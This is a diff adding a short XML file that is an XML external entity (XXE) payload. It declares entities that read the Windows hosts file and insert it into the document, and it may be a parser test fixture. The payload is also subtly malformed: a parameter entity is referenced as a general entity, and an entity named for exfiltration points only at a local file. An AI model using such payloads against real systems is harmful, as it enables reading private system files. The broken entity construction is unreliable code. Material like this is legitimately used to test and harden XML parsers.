@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+    <!ENTITY % file SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
+    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///C:/Windows/System32/drivers/etc/hosts'>">
+    %eval;
+    %exfil;
+]>
+<data>
+    <content>&file;</content>
+</data>
